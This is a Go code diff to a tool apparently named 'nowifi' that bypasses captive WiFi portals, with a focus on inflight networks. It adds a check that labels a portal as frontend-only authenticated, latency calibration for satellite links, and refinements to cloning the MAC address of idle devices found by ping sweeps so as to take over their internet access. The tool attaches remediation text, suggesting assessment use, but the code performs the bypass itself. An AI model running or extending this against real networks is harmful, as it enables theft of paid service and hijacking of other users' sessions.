@@ -41,6 +41,7 @@ import (
 	"net/url"
 	"os/exec"
 	"regexp"
+	"strconv"
 	"strings"
 	"time"
 
@@ -269,7 +270,8 @@ func getNetworkService(iface string) string {
 // ---------------------------------------------------------------------------
 
 func hasInternet() bool {
-	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+	// Use 10s timeout to accommodate satellite links (RTT 500-2500ms).
+	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
 	defer cancel()
 
 	req, _ := http.NewRequestWithContext(ctx, "GET", "http://connectivitycheck.gstatic.com/generate_204", nil)
@@ -479,6 +481,55 @@ func tryJSBypass() Result {
 		}
 	}
 
+	// SPA bypass: check if the portal's backend API is accessible without
+	// the JavaScript frontend. Many inflight portals (Panasonic, Gogo) use
+	// SPAs where auth is only enforced by the JS app, not the API.
+	spaAPIs := []struct {
+		url  string
+		desc string
+	}{
+		{"http://connectivitycheck.gstatic.com/generate_204", "Google 204 via direct request"},
+	}
+
+	// Also try accessing common SPA portal API endpoints if we can detect the portal.
+	// These would return JSON instead of HTML if the backend doesn't enforce auth.
+	for _, api := range spaAPIs {
+		ctx, cancel := context.WithTimeout(context.Background(), 8*time.Second)
+		req, _ := http.NewRequestWithContext(ctx, "GET", api.url, nil)
+		req.Header.Set("User-Agent", "nowifi/1.0")
+		req.Header.Set("Accept", "application/json")
+
+		resp, err := client.Do(req)
+		cancel()
+
+		if err != nil {
+			continue
+		}
+		body, _ := io.ReadAll(resp.Body)
+		resp.Body.Close()
+
+		if resp.StatusCode == 204 || (resp.StatusCode == 200 && len(body) > 0) {
+			bodyStr := strings.ToLower(string(body))
+			isPortal := false
+			for _, kw := range []string{"login", "portal", "captive", "auth"} {
+				if strings.Contains(bodyStr, kw) {
+					isPortal = true
+					break
+				}
+			}
+			if !isPortal {
+				return Result{
+					Method:      JSBypass,
+					Success:     true,
+					Severity:    "high",
+					Impact:      "Internet access — SPA portal only enforces auth in frontend JavaScript",
+					Details:     fmt.Sprintf("API request to %s bypassed portal (%s)", api.url, api.desc),
+					Remediation: "Enforce authentication at the API/gateway level (Kong, nginx), not only in the SPA frontend.",
+				}
+			}
+		}
+	}
+
 	return Result{Method: JSBypass, Success: false, Details: "Portal has server-side enforcement"}
 }
 
@@ -527,6 +578,38 @@ func tryHTTPConnect(probes *ProbeResults, config *Config, plat PlatformOps) Resu
 // Techniques 6-7: MAC clone (idle / any)
 // ---------------------------------------------------------------------------
 
+// measureNetworkLatency probes the gateway RTT to calibrate timeouts.
+// Inflight WiFi (satellite) has 500-2500ms RTT; ground WiFi is typically <50ms.
+func measureNetworkLatency(gateway string) time.Duration {
+	var totalMs int64
+	var count int64
+
+	for i := 0; i < 3; i++ {
+		start := time.Now()
+		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+		err := exec.CommandContext(ctx, "ping", "-c", "1", "-W", "5", gateway).Run()
+		cancel()
+		if err == nil {
+			elapsed := time.Since(start)
+			totalMs += elapsed.Milliseconds()
+			count++
+		}
+	}
+
+	if count == 0 {
+		return 2 * time.Second // Conservative default for unknown networks.
+	}
+
+	avgMs := totalMs / count
+	// Add 50% margin for jitter.
+	return time.Duration(avgMs*3/2) * time.Millisecond
+}
+
+// isInflightNetwork returns true if network latency suggests satellite link.
+func isInflightNetwork(rtt time.Duration) bool {
+	return rtt > 400*time.Millisecond
+}
+
 func tryMACClone(iface string, idleOnly bool, plat PlatformOps) Result {
 	method := MACClone
 	if idleOnly {
@@ -563,22 +646,42 @@ func tryMACClone(iface string, idleOnly bool, plat PlatformOps) Result {
 	}
 
 	if idleOnly {
-		// Identify idle devices: those that don't respond to ping.
+		// Measure network latency to calibrate idle detection.
+		// Critical for satellite links (inflight WiFi) where RTT > 500ms.
+		rtt := measureNetworkLatency(gateway)
+		pingTimeout := "1"
+		if isInflightNetwork(rtt) {
+			// Satellite link: use RTT-based timeout so active devices respond.
+			timeoutSec := int(rtt.Seconds()) + 2
+			if timeoutSec > 10 {
+				timeoutSec = 10
+			}
+			pingTimeout = fmt.Sprintf("%d", timeoutSec)
+			logStatus("Satellite network detected (RTT %dms) -- adjusting idle detection timeout to %ss", rtt.Milliseconds(), pingTimeout)
+		}
+
 		var idle []platform.ArpEntry
 		limit := len(candidates)
 		if limit > 10 {
 			limit = 10
 		}
 		for _, c := range candidates[:limit] {
-			ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
-			err := exec.CommandContext(ctx, "ping", "-c", "1", "-W", "1", c.IP).Run()
+			timeoutDuration := time.Duration(3) * time.Second
+			if isInflightNetwork(rtt) {
+				timeoutDuration = rtt*2 + 3*time.Second
+			}
+			ctx, cancel := context.WithTimeout(context.Background(), timeoutDuration)
+			err := exec.CommandContext(ctx, "ping", "-c", "1", "-W", pingTimeout, c.IP).Run()
 			cancel()
 			if err != nil {
 				idle = append(idle, c)
 			}
 		}
 		if len(idle) == 0 {
-			return Result{Method: method, Success: false, Details: "No idle devices found"}
+			if isInflightNetwork(rtt) {
+				logStatus("No idle devices on satellite network (all %d responded within %dms)", limit, rtt.Milliseconds())
+			}
+			return Result{Method: method, Success: false, Details: fmt.Sprintf("No idle devices found (timeout: %ss, RTT: %dms)", pingTimeout, rtt.Milliseconds())}
 		}
 		candidates = idle
 	}
@@ -605,13 +708,21 @@ func tryMACClone(iface string, idleOnly bool, plat PlatformOps) Result {
 				Method:   method,
 				Success:  true,
 				Severity: "critical",
-				Impact: fmt.Sprintf("Full internet by cloning %sdevice MAC %s (%s)",
+				Impact: fmt.Sprintf("Full internet by cloning %sdevice MAC %s (%s)%s",
 					func() string {
 						if idleOnly {
 							return "idle "
 						}
 						return ""
-					}(), target.MAC, target.IP),
+					}(), target.MAC, target.IP,
+					func() string {
+						// Detect if target uses a randomized (locally-administered) MAC.
+						first, _ := strconv.ParseUint(strings.Split(target.MAC, ":")[0], 16, 8)
+						if first&0x02 != 0 {
+							return " [privacy MAC — all devices on this network use randomized addresses]"
+						}
+						return ""
+					}()),
 				Details:     fmt.Sprintf("Portal uses MAC-only auth. %s", label),
 				Remediation: "Use 802.1X. Enable client isolation. Bind sessions to MAC+IP+DHCP lease. Detect duplicate MACs.",
 			}
